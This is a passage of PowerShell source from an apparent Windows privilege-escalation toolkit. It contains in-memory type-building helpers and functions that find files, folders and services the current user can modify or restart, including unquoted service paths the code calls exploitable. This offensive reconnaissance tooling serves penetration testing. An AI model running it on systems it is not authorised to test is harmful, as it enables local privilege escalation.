                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }
    
                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)
    
                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        $null =  $Method.DefineParameter($i, 'Out', $null)
                    }
    
                    $i++
                }
    
                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                $EntryPointField = $DllImport.GetField('EntryPoint')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
    
                if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
    
                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField,
                                               $CallingConventionField,
                                               $CharsetField,
                                               $EntryPointField),
                    [Object[]] @($SLEValue,
                                 ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                                 ([Runtime.InteropServices.CharSet] $Charset),
                                 $ExportedFuncName))
    
                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }
    
        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }
    
            $ReturnTypes = @{}
    
            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
    
                $ReturnTypes[$Key] = $Type
            }
    
            return $ReturnTypes
        }
    }
    
    
    function script:psenum
    {
    <#
      .SYNOPSIS
    
      Creates an in-memory enumeration for use in your PowerShell session.
    
      Author: Matthew Graeber (@mattifestation)
      License: BSD 3-Clause
      Required Dependencies: None
      Optional Dependencies: None
    
      .DESCRIPTION
    
      The 'psenum' function facilitates the creation of enums entirely in
      memory using as close to a "C style" as PowerShell will allow.
    
      .PARAMETER Module
    
      The in-memory module that will host the enum. Use
      New-InMemoryModule to define an in-memory module.
    
      .PARAMETER FullName
    
      The fully-qualified name of the enum.
    
      .PARAMETER Type
    
      The type of each enum element.
    
      .PARAMETER EnumElements
    
      A hashtable of enum elements.
    
      .PARAMETER Bitfield
    
      Specifies that the enum should be treated as a bitfield.
    
      .EXAMPLE
    
      $Mod = New-InMemoryModule -ModuleName Win32
    
      $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
        UNKNOWN =                  0
        NATIVE =                   1 # Image doesn't require a subsystem.
        WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
        WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
        OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
        POSIX_CUI =                7 # Image runs in the Posix character subsystem.
        NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
        WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
        EFI_APPLICATION =          10
        EFI_BOOT_SERVICE_DRIVER =  11
        EFI_RUNTIME_DRIVER =       12
        EFI_ROM =                  13
        XBOX =                     14
        WINDOWS_BOOT_APPLICATION = 16
      }
    
      .NOTES
    
      PowerShell purists may disagree with the naming of this function but
      again, this was developed in such a way so as to emulate a "C style"
      definition as closely as possible. Sorry, I'm not going to name it
      New-Enum. :P
    #>
    
        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 0, Mandatory=$True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
    
            [Parameter(Position = 1, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,
    
            [Parameter(Position = 2, Mandatory=$True)]
            [Type]
            $Type,
    
            [Parameter(Position = 3, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $EnumElements,
    
            [Switch]
            $Bitfield
        )
    
        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }
    
        $EnumType = $Type -as [Type]
    
        $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    
        if ($Bitfield)
        {
            $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
            $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
            $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        }
    
        foreach ($Key in $EnumElements.Keys)
        {
            # Apply the specified enum type to each element
            $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
        }
    
        $EnumBuilder.CreateType()
    }
    
    
    # A helper function used to reduce typing while defining struct
    # fields.
    function script:field
    {
        Param
        (
            [Parameter(Position = 0, Mandatory=$True)]
            [UInt16]
            $Position,
    
            [Parameter(Position = 1, Mandatory=$True)]
            [Type]
            $Type,
    
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
    
            [Object[]]
            $MarshalAs
        )
    
        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }
    
    
    function script:struct
    {
    <#
      .SYNOPSIS
    
      Creates an in-memory struct for use in your PowerShell session.
    
      Author: Matthew Graeber (@mattifestation)
      License: BSD 3-Clause
      Required Dependencies: None
      Optional Dependencies: field
    
      .DESCRIPTION
    
      The 'struct' function facilitates the creation of structs entirely in
      memory using as close to a "C style" as PowerShell will allow. Struct
      fields are specified using a hashtable where each field of the struct
      is comprosed of the order in which it should be defined, its .NET
      type, and optionally, its offset and special marshaling attributes.
    
      One of the features of 'struct' is that after your struct is defined,
      it will come with a built-in GetSize method as well as an explicit
      converter so that you can easily cast an IntPtr to the struct without
      relying upon calling SizeOf and/or PtrToStructure in the Marshal
      class.
    
      .PARAMETER Module
    
      The in-memory module that will host the struct. Use
      New-InMemoryModule to define an in-memory module.
    
      .PARAMETER FullName
    
      The fully-qualified name of the struct.
    
      .PARAMETER StructFields
    
      A hashtable of fields. Use the 'field' helper function to ease
      defining each field.
    
      .PARAMETER PackingSize
    
      Specifies the memory alignment of fields.
    
      .PARAMETER ExplicitLayout
    
      Indicates that an explicit offset for each field will be specified.
    
      .EXAMPLE
    
      $Mod = New-InMemoryModule -ModuleName Win32
    
      $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
      }
    
      $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
      }
    
      # Example of using an explicit layout in order to create a union.
      $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
      } -ExplicitLayout
    
      .NOTES
    
      PowerShell purists may disagree with the naming of this function but
      again, this was developed in such a way so as to emulate a "C style"
      definition as closely as possible. Sorry, I'm not going to name it
      New-Struct. :P
    #>
    
        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 1, Mandatory=$True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,
    
            [Parameter(Position = 2, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,
    
            [Parameter(Position = 3, Mandatory=$True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,
    
            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
    
            [Switch]
            $ExplicitLayout
        )
    
        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }
    
        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'
    
        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }
    
        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    
        $Fields = New-Object Hashtable[]($StructFields.Count)
    
        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }
    
        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']
    
            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']
    
            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
    
            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
    
                $NewField.SetCustomAttribute($AttribBuilder)
            }
    
            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }
    
        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    
        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    
        $StructBuilder.CreateType()
    }
    
    
    ########################################################
    #
    # PowerUp Helpers
    #
    ########################################################
    
    function Get-ModifiablePath {
    <#
        .SYNOPSIS
    
            Parses a passed string containing multiple possible file/folder paths and returns
            the file paths where the current user has modification rights.
    
            Author: @harmj0y
            License: BSD 3-Clause
    
        .DESCRIPTION
    
            Takes a complex path specification of an initial file/folder path with possible
            configuration files, 'tokenizes' the string in a number of possible ways, and
            enumerates the ACLs for each path that currently exists on the system. Any path that
            the current user has modification rights on is returned in a custom object that contains
            the modifiable path, associated permission set, and the IdentityReference with the specified
            rights. The SID of the current user and any group he/she are a part of are used as the
            comparison set against the parsed path DACLs.
    
        .PARAMETER Path
    
            The string path to parse for modifiable files. Required
    
        .PARAMETER LiteralPaths
    
            Switch. Treat all paths as literal (i.e. don't do 'tokenization').
    
        .EXAMPLE
    
            PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
    
            Path                       Permissions                IdentityReference
            ----                       -----------                -----------------
            C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
            C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
    
        .EXAMPLE
    
            PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
    
            Path                       Permissions                IdentityReference
            ----                       -----------                -----------------
            C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
            C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
            ...
    #>
    
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
            [Alias('FullName')]
            [String[]]
            $Path,
    
            [Switch]
            $LiteralPaths
        )
    
        BEGIN {
            # # false positives ?
            # $Excludes = @("MsMpEng.exe", "NisSrv.exe")
    
            # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
    
            $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
            $CurrentUserSids += $UserIdentity.User.Value
    
            $TranslatedIdentityReferences = @{}
        }
    
        PROCESS {
    
            ForEach($TargetPath in $Path) {
    
                $CandidatePaths = @()
    
                # possible separator character combinations
                $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
    
                if($PSBoundParameters['LiteralPaths']) {
    
                    $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))
    
                    if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                    }
                    else {
                        # if the path doesn't exist, check if the parent folder allows for modification
                        try {
                            $ParentPath = Split-Path $TempPath -Parent
                            if($ParentPath -and (Test-Path -Path $ParentPath)) {
                                $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                            }
                        }
                        catch {
                            # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                        }
                    }
                }
                else {
                    ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                        $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
    
                            if(($SeparationCharacterSet -notmatch ' ')) {
    
                                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
    
                                if($TempPath -and ($TempPath -ne '')) {
                                    if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                        # if the path exists, resolve it and add it to the candidate list
                                        $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                    }
    
                                    else {
                                        # if the path doesn't exist, check if the parent folder allows for modification
                                        try {
                                            $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                            if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
                                                $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                            }
                                        }
                                        catch {
                                            # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                        }
                                    }
                                }
                            }
                            else {
                                # if the separator contains a space
                                $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                            }
                        }
                    }
                }
    
                $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                    $CandidatePath = $_
                    Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
    
                        $FileSystemRights = $_.FileSystemRights.value__
    
                        $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }
    
                        # the set of permission types that allow for modification
                        $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
    
                        if($Comparison) {
                            if ($_.IdentityReference -notmatch '^S-1-5.*') {
                                if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                    # translate the IdentityReference if it's a username and not a SID
                                    $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                    $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                                }
                                $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                            }
                            else {
                                $IdentitySID = $_.IdentityReference
                            }
    
                            if($CurrentUserSids -contains $IdentitySID) {
                                New-Object -TypeName PSObject -Property @{
                                    ModifiablePath = $CandidatePath
                                    IdentityReference = $_.IdentityReference
                                    Permissions = $Permissions
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    
    function Get-CurrentUserTokenGroupSid {
    <#
        .SYNOPSIS
    
            Returns all SIDs that the current user is a part of, whether they are disabled or not.
    
            Author: @harmj0y
            License: BSD 3-Clause
    
        .DESCRIPTION
    
            First gets the current process handle using the GetCurrentProcess() Win32 API call and feeds
            this to OpenProcessToken() to open up a handle to the current process token. The API call
            GetTokenInformation() is then used to enumerate the TOKEN_GROUPS for the current process
            token. Each group is iterated through and the SID structure is converted to a readable
            string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
            (disabled or not) is returned as a string array.
    
        .LINK
    
            https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
            https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
            https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
    #>
    
        [CmdletBinding()]
        Param()
    
        $CurrentProcess = $Kernel32::GetCurrentProcess()
    
        $TOKEN_QUERY= 0x0008
    
        # open up a pseudo handle to the current process- don't need to worry about closing
        [IntPtr]$hProcToken = [IntPtr]::Zero
        $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
        if($Success) {
            $TokenGroupsPtrSize = 0
            # Initial query to determine the necessary buffer size
            $Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
    
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)
    
            # query the current process token with the 'TokenGroups=2' TOKEN_INFORMATION_CLASS enum to retrieve a TOKEN_GROUPS structure
            $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
            if($Success) {
    
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
    
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    # convert each token group SID to a displayable string
                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if($Result -eq 0) {
                        Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $GroupSid = New-Object PSObject
                        $GroupSid | Add-Member Noteproperty 'SID' $SidString
                        # cast the atttributes field as our SidAttributes enum
                        $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                        $GroupSid
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $LastError)
        }
    }
    
    function Test-ServiceDaclPermission {
    <#
        .SYNOPSIS
    
            Tests one or more passed services or service names against a given permission set,
            returning the service objects where the current user have the specified permissions.
    
            Author: @harmj0y, Matthew Graeber (@mattifestation)
            License: BSD 3-Clause
    
        .DESCRIPTION
    
            Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
            a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
            user are enumerated services where the user has some type of permission are filtered. The
            services are then filtered against a specified set of permissions, and services where the
            current user have the specified permissions are returned.
    
        .PARAMETER Name
    
            An array of one or more service names to test against the specified permission set.
    
        .PARAMETER Permissions
    
            A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
            'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
            'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
            'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'
    
        .PARAMETER PermissionSet
    
            A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.
    
        .OUTPUTS
    
            ServiceProcess.ServiceController
    
        .EXAMPLE
    
            PS C:\> Get-Service | Test-ServiceDaclPermission
    
            Return all service objects where the current user can modify the service configuration.
    
        .EXAMPLE
    
            PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'
    
            Return all service objects that the current user can restart.
    
    
        .EXAMPLE
    
            PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'
    
            Return the VulnSVC object if the current user has start permissions.
    
        .LINK
    
            https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    #>
    
        [OutputType('ServiceProcess.ServiceController')]
        param (
            [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
            [Alias('ServiceName')]
            [String[]]
            [ValidateNotNullOrEmpty()]
            $Name,
    
            [String[]]
            [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
            $Permissions,
    
            [String]
            [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
            $PermissionSet = 'ChangeConfig'
        )
    
        BEGIN {
            $AccessMask = @{
                'QueryConfig'           = [uint32]'0x00000001'
                'ChangeConfig'          = [uint32]'0x00000002'
                'QueryStatus'           = [uint32]'0x00000004'
                'EnumerateDependents'   = [uint32]'0x00000008'
                'Start'                 = [uint32]'0x00000010'
                'Stop'                  = [uint32]'0x00000020'
                'PauseContinue'         = [uint32]'0x00000040'
                'Interrogate'           = [uint32]'0x00000080'
                'UserDefinedControl'    = [uint32]'0x00000100'
                'Delete'                = [uint32]'0x00010000'
                'ReadControl'           = [uint32]'0x00020000'
                'WriteDac'              = [uint32]'0x00040000'
                'WriteOwner'            = [uint32]'0x00080000'
                'Synchronize'           = [uint32]'0x00100000'
                'AccessSystemSecurity'  = [uint32]'0x01000000'
                'GenericAll'            = [uint32]'0x10000000'
                'GenericExecute'        = [uint32]'0x20000000'
                'GenericWrite'          = [uint32]'0x40000000'
                'GenericRead'           = [uint32]'0x80000000'
                'AllAccess'             = [uint32]'0x000F01FF'
            }
    
            $CheckAllPermissionsInSet = $False
    
            if($PSBoundParameters['Permissions']) {
                $TargetPermissions = $Permissions
            }
            else {
                if($PermissionSet -eq 'ChangeConfig') {
                    $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
                }
                elseif($PermissionSet -eq 'Restart') {
                    $TargetPermissions = @('Start', 'Stop')
                    $CheckAllPermissionsInSet = $True # so we check all permissions && style
                }
                elseif($PermissionSet -eq 'AllAccess') {
                    $TargetPermissions = @('GenericAll', 'AllAccess')
                }
            }
        }
    
        PROCESS {
    
            ForEach($IndividualService in $Name) {
    
                $TargetService = $IndividualService | Add-ServiceDacl
    
                if($TargetService -and $TargetService.Dacl) {
    
                    # enumerate all group SIDs the current user is a part of
                    $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                    $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                    $CurrentUserSids += $UserIdentity.User.Value
    
                    ForEach($ServiceDacl in $TargetService.Dacl) {
                        if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {
    
                            if($CheckAllPermissionsInSet) {
                                $AllMatched = $True
                                ForEach($TargetPermission in $TargetPermissions) {
                                    # check permissions && style
                                    if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                        # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                        $AllMatched = $False
                                        break
                                    }
                                }
                                if($AllMatched) {
                                    $TargetService
                                }
                            }
                            else {
                                ForEach($TargetPermission in $TargetPermissions) {
                                    # check permissions || style
                                    if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                        Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                        $TargetService
                                        break
                                    }
                                }
                            }
                        }
                    }
                }
                else {
                    Write-Verbose "Error enumerating the Dacl for service $IndividualService"
                }
            }
        }
    }
    
    
    ########################################################
    #
    # Service enumeration
    #
    ########################################################
    
    function Get-ServiceUnquoted {
    <#
        .SYNOPSIS
    
            Returns the name and binary path for services with unquoted paths
            that also have a space in the name.
    
        .EXAMPLE
    
            PS C:\> $services = Get-ServiceUnquoted
    
            Get a set of potentially exploitable services.
    
        .LINK
    
            https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
    #>
        [CmdletBinding()] param()
    
        # find all paths to service .exe's that have a space in the path and aren't quoted
        $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}
    
        if ($VulnServices) {
            ForEach ($Service in $VulnServices) {
    
                $ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath
    
                $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                    $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
    
                    if($ServiceRestart) {
                        $CanRestart = $True
                    }
                    else {
                        $CanRestart = $False
                    }
    
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                    $Out | Add-Member Noteproperty 'Path' $Service.pathname
                    $Out | Add-Member Noteproperty 'ModifiablePath' $_
                    $Out | Add-Member Noteproperty 'StartName' $Service.startname
